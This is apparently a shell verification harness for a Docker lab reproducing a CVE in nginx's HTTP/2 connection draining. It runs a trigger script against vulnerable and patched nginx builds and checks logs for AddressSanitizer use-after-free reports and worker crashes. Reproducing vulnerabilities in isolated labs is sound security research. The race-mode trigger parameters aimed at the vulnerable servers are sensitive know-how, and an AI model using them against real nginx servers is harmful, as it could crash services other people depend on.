#!/bin/sh
# CVE-2026-123633 lab — bounded verification harness (S4: Docker-only).
#
# Honest-status semantics: the client-observable CVE WINDOW is
# REPRODUCED (the connection-drain selects an ACTIVE h2 connection
# mid-request and GOAWAYs it before the response data — vuln 1.31.8,
# never fixed 1.31.9; see README.md), but the terminal memory-safety
# event (heap-use-after-free report / stock worker crash) is NOT yet
# landed: the final free-under-caller needs the dead-socket detection
# to fire inside the drain-invoked read handler, a sub-millisecond
# window this harness races for but cannot yet hit deterministically.
# So this harness:
#   1. asserts all six services healthy,
#   2. asserts the h2 stack works on all four nginx variants (sanity),
#   3. asserts the DIFFERENTIAL ORACLE: vuln + vuln-asan show
#      VULNERABLE-STATE (drain GOAWAY before response data) and
#      fixed + fixed-asan show PATCHED-STATE — the stale-reusable-mark
#      window, i.e. the CVE mechanism, exercised and observed,
#   4. runs the bounded crash-race matrix on vuln and vuln-asan and
#      prints any worker-death / ASAN evidence VERBATIM (informational:
#      absence is not a failure of the harness, it is the honest race
#      state),
#   5. asserts the fixed controls stay death/report-free under the
#      identical trigger (differential integrity),
#   6. worker-safety grep across all four variants.
#
# Everything bounded: compose up/build under timeout 600, every trigger
# run under timeout 120 (the client is timeout-safe: settimeout()
# everywhere plus a SIGALRM watchdog per attempt).
#
# Runtime ~4-5 min. Exit 0 = lab functional + oracle differential holds
# (see README for the semantics of the race itself).

set -u
cd "$(dirname "$0")"

FAIL=0
logcount() { docker compose logs --since 30m "$1" 2>&1 | grep -c "$2" || true; }
step() { printf '\n=== %s ===\n' "$1"; }

step "0. build + start all services (bounded, no-op if already up)"
timeout 600 docker compose up -d --build --wait \
    || { echo "FAIL: compose up --wait"; exit 1; }

step "1. h2 stack sanity — one proxied h2 GET on each variant"
for svc in vuln fixed vuln-asan fixed-asan; do
    out=$(timeout 120 docker compose exec -T probe python \
        /poc/123633/trigger.py --mode sanity --target "$svc:9443" \
        --path /proxied 2>&1 | tail -1)
    echo "$svc: $out"
    case "$out" in
        *SANITY-OK*) ;;
        *) echo "FAIL: $svc h2 sanity"; FAIL=1 ;;
    esac
done

step "2. differential oracle — the CVE window, client-observable"
# vuln: the drain GOAWAYs the ACTIVE h2 connection before the response
# data (VULNERABLE-STATE). fixed: create_stream un-marks, the drain
# never selects the h2 connection (PATCHED-STATE).
for svc in vuln fixed vuln-asan fixed-asan; do
    want_vuln=0
    case "$svc" in vuln*) want_vuln=1 ;; esac
    out=$(timeout 120 docker compose exec -T probe python \
        /poc/123633/trigger.py --mode oracle --target "$svc:9443" \
        --path /refused --repeat 3 2>&1 | grep -c "VULNERABLE-STATE" || true)
    echo "$svc: $out/3 attempts VULNERABLE-STATE (want: $([ $want_vuln -eq 1 ] && echo 3 || echo 0))"
    if [ "$want_vuln" -eq 1 ] && [ "$out" -lt 3 ]; then
        echo "FAIL: $svc did not show the drain-hit-active-h2 oracle"; FAIL=1
    fi
    if [ "$want_vuln" -eq 0 ] && [ "$out" -gt 0 ]; then
        echo "FAIL: $svc (fixed) showed the vulnerable oracle — differential broken"; FAIL=1
    fi
done

step "3. crash-race matrix on the vulnerable pair (informational)"
# Server-side evidence of record. Any hit prints verbatim below.
for svc in vuln vuln-asan; do
    b=$(logcount "$svc" "exited on signal\\|AddressSanitizer\\|http request count is zero")
    timeout 120 docker compose exec -T probe python \
        /poc/123633/trigger.py --mode race --target "$svc:9443" \
        --path /refused --rst-gap 0.4 --headers 20 --repeat 6 \
        >/dev/null 2>&1
    timeout 120 docker compose exec -T probe python \
        /poc/123633/trigger.py --mode race --target "$svc:9443" \
        --path /refused --rst-gap 0.4 --close-mode fin --headers 20 \
        --repeat 6 >/dev/null 2>&1
    a=$(logcount "$svc" "exited on signal\\|AddressSanitizer\\|http request count is zero")
    echo "$svc: race markers before/after: $b -> $a"
    if [ "$a" -gt "$b" ]; then
        echo "=== FIRST EVIDENCE (verbatim) ==="
        timeout 30 docker compose logs "$svc" --tail 200 2>&1 \
            | grep -B2 -A25 "ERROR: AddressSanitizer" | head -35
        timeout 30 docker compose logs "$svc" --tail 200 2>&1 \
            | grep -E "exited on signal|http request count is zero" | tail -3
    else
        echo "INFO: no ASAN report / worker death on $svc — race not landed (honest state; see README)"
    fi
done

step "4. fixed controls under the identical trigger — zero tolerance"
for svc in fixed fixed-asan; do
    b=$(logcount "$svc" "exited on signal\\|AddressSanitizer\\|http request count is zero")
    timeout 120 docker compose exec -T probe python \
        /poc/123633/trigger.py --mode race --target "$svc:9443" \
        --path /refused --rst-gap 0.4 --headers 20 --repeat 6 \
        >/dev/null 2>&1
    timeout 120 docker compose exec -T probe python \
        /poc/123633/trigger.py --mode race --target "$svc:9443" \
        --path /refused --rst-gap 0.4 --close-mode fin --headers 20 \
        --repeat 6 >/dev/null 2>&1
    a=$(logcount "$svc" "exited on signal\\|AddressSanitizer\\|http request count is zero")
    echo "$svc: race markers before/after: $b -> $a"
    if [ "$a" -gt "$b" ]; then
        echo "FAIL: $svc (fixed control) reported under the trigger — differential broken"
        FAIL=1
    else
        echo "PASS: $svc clean under identical trigger"
    fi
done

step "5. worker-safety grep (all four, whole session)"
for svc in vuln fixed vuln-asan fixed-asan; do
    n=$(logcount "$svc" "exited on signal")
    echo "$svc: $n worker death line(s) total this session"
done

printf '\n==== verify: %s ====\n' "$([ "$FAIL" -eq 0 ] && echo PASS || echo FAIL)"
exit "$FAIL"
